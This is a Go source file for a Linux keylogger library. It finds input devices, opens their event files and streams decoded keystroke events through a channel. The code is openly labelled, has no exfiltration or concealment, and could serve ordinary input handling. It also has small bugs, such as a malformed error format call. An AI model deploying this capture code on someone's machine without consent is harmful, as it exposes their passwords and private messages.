// keylogger
package keylogger

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func NewDevices() ([]*InputDevice, error) {
	var ret []*InputDevice

	for i := 0; i < MAX_FILES; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(INPUTS, i))
		if err != nil {
			break
		}
		ret = append(ret, newInputDeviceReader(buff, i))
	}

	return ret, nil
}

func newInputDeviceReader(buff []byte, id int) *InputDevice {
	rd := bufio.NewReader(bytes.NewReader(buff))
	rd.ReadLine()
	dev, _, _ := rd.ReadLine()
	splt := strings.Split(string(dev), "=")

	return &InputDevice{
		Id:   id,
		Name: splt[1],
	}
}

func NewKeyLogger(dev *InputDevice) *KeyLogger {
	return &KeyLogger{
		dev: dev,
	}
}

func (t *KeyLogger) Read() (chan InputEvent, error) {
	ret := make(chan InputEvent, 512)

	fd, err := os.Open(fmt.Sprintf(DEVICE_FILE, t.dev.Id))
	if err != nil {
		close(ret)
		return ret, fmt.Errorf("Error opening device file:", err)
	}

	go func() {

		tmp := make([]byte, eventsize)
		event := InputEvent{}
		for {

			n, err := fd.Read(tmp)
			if err != nil {
				panic(err)
				close(ret)
				break
			}
			if n <= 0 {
				continue
			}

			if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
				panic(err)
			}

			ret <- event

		}
	}()
	return ret, nil
}

func (t *InputEvent) KeyString() string {
	return keyCodeMap[t.Code]
}
